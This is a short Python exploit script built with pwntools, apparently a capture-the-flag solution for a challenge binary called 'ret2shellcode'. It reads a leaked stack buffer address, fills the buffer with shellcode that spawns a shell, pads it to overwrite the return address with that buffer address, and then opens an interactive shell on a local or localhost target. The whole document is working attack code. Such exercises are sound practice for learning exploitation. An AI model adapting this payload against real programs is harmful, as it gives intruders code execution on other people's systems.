#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 2
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./ret2shellcode')
else:
    p = remote('localhost', 10000)

p.recvuntil('Here is your reward [')
addr_buf = int(p.recvuntil(']')[:-1], 16)
pd = asm(shellcraft.sh())
pd = pd.ljust(0x308, '\x00')
pd += p64(addr_buf)
p.sendafter('get flag\n', pd)
p.interactive()
